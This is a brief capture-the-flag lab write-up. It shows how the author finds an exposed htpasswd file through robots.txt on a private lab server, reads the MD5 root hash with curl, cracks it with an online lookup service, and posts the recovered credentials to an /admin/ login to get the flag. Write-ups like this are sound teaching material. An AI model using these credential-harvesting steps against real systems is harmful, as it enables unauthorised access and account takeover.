If we visited robots.txt we get the following paths

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

Following the path whatever we get the follwing output

```
Index of /whatever/

../
htpasswd                                           29-Jun-2021 18:09                  38
```

Using curl to get the content of htpassd

```
*[main][/goinfre/mashad/projects/darkly]$ curl http://10.12.177.95/whatever/htpasswd
root:437394baff5aa33daa618be47b75cb49
*[main][/goinfre/mashad/projects/darkly]$ 
```

It's seems that its a hashed password, we going to use https://crackstation.net to try and crack the password.

Crackstation results was as bellow:

**437394baff5aa33daa618be47b75cb49 - qwerty123@ - Possible algorithms: MD5**

After digging more into hidden directories we found a login pannel for admin in the following url: http://10.12.177.95/admin/

Using curl to POST the username and password and get the flag

```
*[main][/goinfre/mashad/projects/darkly]$ curl -X POST -d "username=root&password=qwerty123@&Login=Login" http://10.12.177.95/admin/

<center><h2 style="margin-top:50px;">The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff </h2><br/><img src="../images/whoami.gif" alt=""><br /><br /><img src="../images/congratz.jpg" alt=""></center>%

*[main][/goinfre/mashad/projects/darkly]$ 
```